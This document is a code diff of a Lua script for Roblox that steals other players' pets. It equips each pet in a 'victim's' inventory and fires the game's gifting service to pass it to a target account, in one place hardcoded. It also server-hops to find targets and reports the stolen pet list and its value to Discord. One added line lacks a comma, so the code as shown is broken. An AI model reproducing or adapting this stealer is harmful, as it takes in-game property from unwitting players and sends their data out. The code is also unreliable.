@@ -1,9 +1,3 @@
-if getgenv().scriptAlreadyRan then
-    warn("⚠️ ScriptAlreadyRun.")
-    return
-end
-getgenv().scriptAlreadyRan = true
-
 repeat 
     task.wait()
 until game:IsLoaded()
@@ -18,18 +12,14 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
-
--- Проверка, приватный ли сервер (работает только если ты владелец)
 local function isPrivateServer()
     return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
 end
 
--- Проверка, заполнен ли сервер
 local function isServerFull()
     return #Players:GetPlayers() >= Players.MaxPlayers
 end
 
--- Проверка, есть ли цель на сервере
 local function isTargetOnServer()
     for _, player in ipairs(Players:GetPlayers()) do
         if table.find(USERNAMES, player.Name) then
@@ -39,9 +29,8 @@ local function isTargetOnServer()
     return false
 end
 
--- Сервер хоп — прыжок на другой публичный сервер
 local function tryServerHop()
-    local MAX_OCCUPANCY = 2 -- Игнорируем почти заполненные сервера
+    local MAX_OCCUPANCY = 4 -- Allow servers with 3 or fewer players
     local success, result = pcall(function()
         local url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
         return HttpService:JSONDecode(game:HttpGet(url))
@@ -50,36 +39,16 @@ local function tryServerHop()
     if success and result and result.data then
         for _, server in ipairs(result.data) do
             if server.id ~= game.JobId and server.playing < MAX_OCCUPANCY then
-                print(string.format("🔁 Прыгаем на сервер: %s (%d/%d)", server.id, server.playing, server.maxPlayers))
+                print(string.format("🔁 Jumping to server: %s (%d/%d)", server.id, server.playing, server.maxPlayers))
                 TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                 return
             end
         end
-        warn("❌ Нет подходящих серверов (все переполнены).")
+        warn("❌ No suitable servers found (all are full).")
     else
-        warn("❌ Не удалось получить список серверов.")
+        warn("❌ Failed to fetch server list.")
     end
 end
-
-
-
--- Основной цикл проверки сервера
-task.spawn(function()
-    while true do
-        task.wait(1) -- Проверять каждые 10 секунд
-        if isPrivateServer() then
-            print("🚫 Приватный сервер — прыгаем")
-            tryServerHop()
-        elseif isServerFull() and not isTargetOnServer() then
-            print("📡 Сервер полон и цели нет — прыгаем")
-            tryServerHop()
-        end
-    end
-end)
-
--- Твоя логика по Discord, питомцам и взаимодействию
--- ⚠️ Вставь весь остальной скрипт ниже (например, начиная с: getPlayersPets(), createDiscordEmbed(...) и т.д.)
-
 
 
 local PET_WHITELIST = {
@@ -94,6 +63,7 @@ local PET_WHITELIST = {
     'Queen Bee',
     'Spinosaurus',
     'Kitsune',
+    'Corrupted Kitsune'
     'Chicken Zombie',
     'Red Fox',
     'French Fry Ferret',
@@ -225,37 +195,10 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "LoadingScreen"
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-
-
-
 
 
 local function teleportTarget(targetName)
     VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
-end
-
-local function deltaBypass()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0,      
-        true,   
-        nil,    
-        false   
-    )
-
-    task.wait()
-
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0,
-        false,
-        nil,
-        false
-    )
 end
 
 local function checkPetsWhilelist(pet)
@@ -314,11 +257,13 @@ end
 
 
 local function startSteal(trigerName)
-    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
-        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
-        deltaBypass()
+    local targetPlayer = "monkey_master6"
+    if targetPlayer then
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
     end
 end
+
+
 
 local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
@@ -327,14 +272,22 @@ local function checkPetsInventory(target)
         end
 
         local petObject = getPetObject(petUid)
-        
         if not petObject then
             continue
         end
-        
+
         equipPet(petObject)
-        task.wait(0.2)
-        startSteal(target)
+
+        -- Fire gift request directly
+        local targetPlayer = game.Players:FindFirstChild(target)
+        if targetPlayer then
+            game:GetService("ReplicatedStorage")
+                :WaitForChild("GameEvents")
+                :WaitForChild("PetGiftingService")
+                :FireServer("GivePet", targetPlayer)
+        end
+
+        task.wait(0.2) -- Small delay between each gift
     end
 end
 
@@ -367,7 +320,6 @@ end
 
 getPlayersPets()
 
--- Если таблица пустая — не отправляем
 if #victimPetTable == 0 or #victimPetTable == nil then
     warn("❌ Нет подходящих питомцев — сообщение не будет отправлено в Discord.")
     return
@@ -377,3 +329,4 @@ end
 createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
     idlingTarget()
 end)
+
